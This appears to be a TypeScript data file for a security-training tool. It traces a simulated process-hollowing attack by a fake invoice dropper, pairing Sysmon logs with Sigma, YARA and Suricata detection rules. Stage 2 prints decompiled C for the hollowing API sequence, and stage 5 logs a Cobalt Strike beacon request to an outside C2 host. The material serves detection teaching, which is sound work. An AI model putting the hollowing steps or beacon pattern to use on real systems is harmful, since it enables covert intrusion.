import { TelemetryEvent } from './types';

export const PROCESS_HOLLOWING_TELEMETRY: TelemetryEvent[] = [
  {
    id: 'ph-1',
    no: 1,
    stageIndex: 1,
    timestamp: '00:00.120',
    sourceNodeId: 'dropper',
    targetNodeId: 'svchost',
    sourceLabel: 'Invoice_Q4.exe (3104)',
    targetLabel: 'svchost.exe (4892)',
    sourceType: 'SYSMON',
    protocolOrEventId: 'Sysmon EID 1',
    shortAction: 'CREATE_SUSPENDED',
    info: 'CreateProcessW: C:\\Windows\\System32\\svchost.exe (Flags: 0x4)',
    sizeOrCode: 'PID 4892',
    severity: 'HIGH',
    mitreId: 'T1055.012',
    explanation: 'Sysmon Event ID 1 logs the creation of svchost.exe. Two critical anomalies appear here: First, the ParentImage is Invoice_Q4.exe instead of C:\\Windows\\System32\\services.exe. Second, CommandLine has no "-k <group>" parameter.',
    rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-11-12T08:14:00.120Z"/>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-11-12 08:14:00.120</Data>
    <Data Name="ProcessId">4892</Data>
    <Data Name="Image">C:\\Windows\\System32\\svchost.exe</Data>
    <Data Name="CommandLine">C:\\Windows\\System32\\svchost.exe</Data>
    <Data Name="User">CORP\\s.ahmadi</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="ParentProcessId">3104</Data>
    <Data Name="ParentImage">C:\\Users\\s.ahmadi\\Downloads\\Invoice_Q4.exe</Data>
    <Data Name="ParentCommandLine">"C:\\Users\\s.ahmadi\\Downloads\\Invoice_Q4.exe"</Data>
  </EventData>
</Event>`,
    detectionRule: {
      type: 'SIGMA',
      title: 'Suspicious Svchost Process Parent & Missing -k Flag',
      ruleCode: `title: Suspicious Svchost Process Creation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\svchost.exe'
  filter_legit_parent:
    ParentImage|endswith:
      - '\\services.exe'
      - '\\MsMpEng.exe'
  condition: selection and not filter_legit_parent
level: high`,
      mitigation: 'Alert immediately on any svchost.exe process creation where ParentImage is not services.exe or CommandLine lacks the -k service group flag.' } },
  {
    id: 'ph-2',
    no: 2,
    stageIndex: 2,
    timestamp: '00:00.185',
    sourceNodeId: 'dropper',
    targetNodeId: 'ntdll',
    sourceLabel: 'Invoice_Q4.exe (3104)',
    targetLabel: 'ntdll.dll -> svchost',
    sourceType: 'WIN32_API',
    protocolOrEventId: 'Win32 API',
    shortAction: 'NtUnmapView',
    info: 'NtUnmapViewOfSection(hProcess=0x1C4, BaseAddr=0x00400000) -> STATUS_SUCCESS',
    sizeOrCode: '0x00400000',
    severity: 'HIGH',
    mitreId: 'T1055.012',
    explanation: 'Malware sandbox API trace captures the loader reading PEB->ImageBaseAddress and invoking NtUnmapViewOfSection to unmap the legitimate svchost.exe image at 0x00400000.',
    rawLog: `// Malware Decompiled C Trace (PID 3104 -> PID 4892)
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

PVOID imageBase = 0;
ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(PVOID), NULL);
// imageBase resolved to 0x0000000000400000

NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
// Returns 0x00000000 (STATUS_SUCCESS) - Target process is now hollowed`,
    detectionRule: {
      type: 'YARA',
      title: 'YARA Rule: Process Hollowing API Sequence Imports',
      ruleCode: `rule Malware_ProcessHollowing_Loader {
  meta:
    author = "SOC Threat Hunting"
    mitre = "T1055.012"
  strings:
    $api1 = "CreateProcess" ascii wide
    $api2 = "NtUnmapViewOfSection" ascii wide
    $api3 = "VirtualAllocEx" ascii wide
    $api4 = "WriteProcessMemory" ascii wide
    $api5 = "SetThreadContext" ascii wide
  condition:
    uint16(0) == 0x5A4D and all of ($api*)
}`,
      mitigation: 'Monitor Kernel ETW-Ti callbacks for NtUnmapViewOfSection targeting processes currently in a suspended state.' } },
  {
    id: 'ph-3',
    no: 3,
    stageIndex: 3,
    timestamp: '00:00.240',
    sourceNodeId: 'dropper',
    targetNodeId: 'svchost',
    sourceLabel: 'Invoice_Q4.exe (3104)',
    targetLabel: 'svchost.exe (4892)',
    sourceType: 'SYSMON',
    protocolOrEventId: 'Sysmon EID 10',
    shortAction: 'RWX WRITE',
    info: 'ProcessAccess: GrantedAccess=0x1FFFFF + VirtualAllocEx(RWX 264KB)',
    sizeOrCode: '264 KB',
    severity: 'CRITICAL',
    mitreId: 'T1055.012',
    explanation: 'Sysmon Event ID 10 records Invoice_Q4.exe opening a handle to svchost.exe with PROCESS_ALL_ACCESS (0x1FFFFF), followed by cross-process RWX allocation and PE injection.',
    rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>10</EventID>
  </System>
  <EventData>
    <Data Name="SourceProcessId">3104</Data>
    <Data Name="SourceImage">C:\\Users\\s.ahmadi\\Downloads\\Invoice_Q4.exe</Data>
    <Data Name="TargetProcessId">4892</Data>
    <Data Name="TargetImage">C:\\Windows\\System32\\svchost.exe</Data>
    <Data Name="GrantedAccess">0x1fffff</Data>
    <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\s.ahmadi\\Downloads\\Invoice_Q4.exe+14a20</Data>
  </EventData>
</Event>`,
    detectionRule: {
      type: 'SIGMA',
      title: 'Sysmon EID 10 High-Privilege Access to System Process',
      ruleCode: `title: Suspicious Process Access to Svchost
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\\svchost.exe'
    GrantedAccess:
      - '0x1fffff'
      - '0x1f3fff'
  filter:
    SourceImage|startswith: 'C:\\Windows\\System32\\'
  condition: selection and not filter
level: critical`,
      mitigation: 'Enable EDR periodic memory scanning for unbacked PAGE_EXECUTE_READWRITE pages and alert on Sysmon EID 10 with PROCESS_VM_WRITE.' } },
  {
    id: 'ph-4',
    no: 4,
    stageIndex: 4,
    timestamp: '00:00.310',
    sourceNodeId: 'svchost',
    targetNodeId: 'edr_sysmon',
    sourceLabel: 'svchost.exe (4892)',
    targetLabel: 'Sysmon Sensor',
    sourceType: 'SYSMON',
    protocolOrEventId: 'Sysmon EID 25',
    shortAction: 'IMAGE TAMPERED',
    info: 'ProcessTampering: Type="Image is replaced" (SetThreadContext + ResumeThread)',
    sizeOrCode: 'EID 25',
    severity: 'CRITICAL',
    mitreId: 'T1055.012',
    explanation: 'As soon as ResumeThread executes, Sysmon Event ID 25 (ProcessTampering) fires. Event ID 25 specifically detects Process Hollowing when the mapped memory image of a process no longer matches the backing file on disk.',
    rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>25</EventID>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-11-12 08:14:00.310</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-4892-0001-0000-000000000000}</Data>
    <Data Name="ProcessId">4892</Data>
    <Data Name="Image">C:\\Windows\\System32\\svchost.exe</Data>
    <Data Name="Type">Image is replaced</Data>
    <Data Name="User">CORP\\s.ahmadi</Data>
  </EventData>
</Event>`,
    detectionRule: {
      type: 'SIGMA',
      title: 'Sysmon Event ID 25 Process Tampering Alert',
      ruleCode: `title: Process Tampering Detected via Sysmon EID 25
logsource:
  category: process_tampering
  product: windows
detection:
  selection:
    EventID: 25
    Type: 'Image is replaced'
  condition: selection
level: critical`,
      mitigation: 'Ensure <ProcessTampering onmatch="exclude"/> is enabled in your Sysmon XML configuration to capture Event ID 25 across endpoints.' } },
  {
    id: 'ph-5',
    no: 5,
    stageIndex: 5,
    timestamp: '00:01.450',
    sourceNodeId: 'svchost',
    targetNodeId: 'c2_server',
    sourceLabel: 'svchost.exe (4892)',
    targetLabel: '185.220.101.42:443',
    sourceType: 'NETWORK',
    protocolOrEventId: 'HTTPS / EID 3',
    shortAction: 'C2 BEACON',
    info: 'TLS ClientHello + GET /jquery-3.3.1.min.js (JA3: 72a589da...)',
    sizeOrCode: '1.4 KB',
    severity: 'CRITICAL',
    mitreId: 'T1071.001',
    explanation: 'The injected Cobalt Strike beacon initiates an outbound HTTPS connection from svchost.exe to 185.220.101.42:443, embedding RSA-encrypted host metadata inside the HTTP Cookie header.',
    rawLog: `GET /jquery-3.3.1.min.js HTTP/1.1
Host: cdn-static-update.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Cookie: __cfduid=d8a9f012e4b1c3a89012f3a4b5c6d7e8f9a0b1c2d3e4f5a6... (128-byte RSA encrypted Beacon metadata)
Connection: keep-alive

[Suricata Alert: ETPRO TROJAN Cobalt Strike Malleable C2 JQuery Profile M2]
[Sysmon EID 3: Image=C:\\Windows\\System32\\svchost.exe -> DestIp=185.220.101.42 DestPort=443]`,
    detectionRule: {
      type: 'SURICATA',
      title: 'Suricata IDS: Cobalt Strike Malleable C2 JQuery Profile',
      ruleCode: `alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"ET TROJAN CobaltStrike Malleable C2 JQuery GET Request";
  flow:established,to_server;
  http.method; content:"GET";
  http.uri; content:"/jquery-3.3.1.min.js"; fast_pattern;
  http.cookie; content:"__cfduid=";
  classtype:trojan-activity; sid:2031482; rev:3;
)`,
      mitigation: 'Isolate the host via EDR, block the C2 IP/JA3 hash at the perimeter proxy, and hunt for any svchost.exe making external connections to non-Microsoft ASNs.' } },
];
